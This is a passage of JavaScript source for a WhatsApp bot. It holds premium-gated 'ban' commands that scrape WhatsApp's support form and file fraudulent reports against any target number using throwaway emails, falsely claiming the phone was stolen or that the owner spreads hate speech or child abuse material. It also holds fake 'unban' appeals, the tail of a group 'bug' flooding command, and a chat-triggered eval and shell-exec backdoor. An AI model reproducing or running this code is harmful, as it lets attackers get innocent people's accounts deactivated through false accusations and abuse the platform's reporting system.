              scheduledCallCreationMessage.message,
              { messageId: scheduledCallCreationMessage.key.id }
            );
            await sleep(3000);
          }
          replygcnhd(
            `*Successfully sent Bug To ${nhdgc} Please pause for 3 minutes*`
          );
        }
        break;

      //ban/unban cases
      case "out":
      case "verif":
        {
          if (!isPrem) return replyprem(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let nhdnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let nhdtesx = await NhdBotFunc.onWhatsApp(nhdnumx);
          if (nhdtesx.length == 0)
            return replygcnhd(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let nhdxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = nhdxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(nhdxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", nhdnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append("your_message", "Perdido/roubado: desative minha conta");
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          NhdBotFunc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "banv1":
        {
          if (!isPrem) return replyprem(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let nhdnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let nhdtesx = await NhdBotFunc.onWhatsApp(nhdnumx);
          if (nhdtesx.length == 0)
            return replygcnhd(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let nhdxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = nhdxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(nhdxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", nhdnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          NhdBotFunc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "banv2":
        {
          if (!isPrem) return replyprem(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let nhdnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let nhdtesx = await NhdBotFunc.onWhatsApp(nhdnumx);
          if (nhdtesx.length == 0)
            return replygcnhd(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let nhdxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = nhdxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(nhdxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", nhdnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          NhdBotFunc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "banv3":
        {
          if (!isPrem) return replyprem(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let nhdnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let nhdtesx = await NhdBotFunc.onWhatsApp(nhdnumx);
          if (nhdtesx.length == 0)
            return replygcnhd(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let nhdxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = nhdxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(nhdxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", nhdnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          NhdBotFunc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "banv4":
        {
          if (!isPrem) return replyprem(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let nhdnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let nhdtesx = await NhdBotFunc.onWhatsApp(nhdnumx);
          if (nhdtesx.length == 0)
            return replygcnhd(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let nhdxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = nhdxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(nhdxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", nhdnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          NhdBotFunc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "banv5":
        {
          if (!isPrem) return replyprem(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          nhdnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let nhdtesx = await NhdBotFunc.onWhatsApp(nhdnumx);
          if (nhdtesx.length == 0)
            return replygcnhd(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let nhdxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = nhdxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(nhdxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", nhdnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          NhdBotFunc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "banv6":
        {
          if (!isPrem) return replyprem(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let nhdnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let nhdtesx = await NhdBotFunc.onWhatsApp(nhdnumx);
          if (nhdtesx.length == 0)
            return replygcnhd(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let nhdxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = nhdxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(nhdxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", nhdnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          NhdBotFunc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "unbanv1":
        {
          if (!isPrem) return replyprem(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let nhdnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let nhdtesx = await NhdBotFunc.onWhatsApp(nhdnumx);
          if (nhdtesx.length == 0)
            return replygcnhd(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let nhdxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = nhdxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(nhdxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", nhdnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          NhdBotFunc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "unbanv2":
        {
          if (!isPrem) return replyprem(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let nhdnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let nhdtesx = await NhdBotFunc.onWhatsApp(nhdnumx);
          if (nhdtesx.length == 0)
            return replygcnhd(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let nhdxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = nhdxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(nhdxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", nhdnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          NhdBotFunc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "unbanv3":
        {
          if (!isPrem) return replyprem(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let nhdnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let nhdtesx = await NhdBotFunc.onWhatsApp(nhdnumx);
          if (nhdtesx.length == 0)
            return replygcnhd(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let nhdxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = nhdxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(nhdxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", nhdnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          NhdBotFunc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "unbanv4":
        {
          if (!isPrem) return replyprem(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let nhdnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let nhdtesx = await NhdBotFunc.onWhatsApp(nhdnumx);
          if (nhdtesx.length == 0)
            return replygcnhd(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let nhdxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = nhdxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(nhdxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", nhdnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          NhdBotFunc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;
      case "unbanv5":
        {
          if (!isPrem) return replyprem(mess.premium);
          if (!args[0])
            return replygcnhd(
              `Use ${prefix + command} number\nExample ${
                prefix + command
              } 916969696969`
            );
          let nhdnumx = `+` + q.split("|")[0].replace(/[^0-9]/g, "");
          let nhdtesx = await NhdBotFunc.onWhatsApp(nhdnumx);
          if (nhdtesx.length == 0)
            return replygcnhd(
              `Enter a valid and registered number on WhatsApp!!!`
            );
          let axioss = require("axios");
          let nhdxos = await axioss.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          let email = await axioss.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          let cookie = nhdxos.headers["set-cookie"].join("; ");
          const cheerio = require("cheerio");
          let $ = cheerio.load(nhdxos.data);
          let $form = $("form");
          let url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          let form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", "INDIA");
          form.append("phone_number", nhdnumx);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");
          let res = await axioss({
            url,
            method: "POST",
            data: form,
            headers: {
              cookie,
            },
          });
          NhdBotFunc.sendMessage(
            from,
            { text: util.format(res.data) },
            { quoted: m }
          );
        }
        break;

      default:
        if (budy.startsWith("<")) {
          if (!NhdTheCreator) return;
          try {
            return m.reply(
              JSON.stringify(eval(`${args.join(" ")}`), null, "\t")
            );
          } catch (e) {
            m.reply(e);
          }
        }

        if (budy.startsWith("vv")) {
          if (!NhdTheCreator) return;
          try {
            let evaled = await eval(budy.slice(2));
            if (typeof evaled !== "string")
              evaled = require("util").inspect(evaled);
            await m.reply(evaled);
          } catch (err) {
            m.reply(String(err));
          }
        }

        if (budy.startsWith("uu")) {
          if (!NhdTheCreator) return;
          qur = budy.slice(2);
          exec(qur, (err, stdout) => {
            if (err) return m.reply(`${err}`);
            if (stdout) {
              m.reply(stdout);
            }
          });
        }

        if (isCmd && budy.toLowerCase() != undefined) {
          if (m.chat.endsWith("broadcast")) return;
          if (m.isBaileys) return;
          let msgs = global.db.database;
          if (!(budy.toLowerCase() in msgs)) return;
          NhdBotFunc.copyNForward(m.chat, msgs[budy.toLowerCase()], true);
        }
    }
  } catch (err) {
    console.log(util.format(err));
    let e = String(err);
    NhdBotFunc.sendMessage("916909137213@s.whatsapp.net", {
      text:
        "Hello developer, there seems to be an error, please fix it " +
        util.format(e),
      contextInfo: {
        forwardingScore: 9999999,
        isForwarded: true,
      },
    });
    if (e.includes("rate-overlimit")) return;
    if (e.includes("Connection Closed")) return;
    if (e.includes("Timed Out")) return;
    if (e.includes("Value not found")) return;
    if (e.includes("Socket connection timeout")) return;
  }
};

process.on("uncaughtException", function (err) {
  console.log("Caught exception: ", err);
});
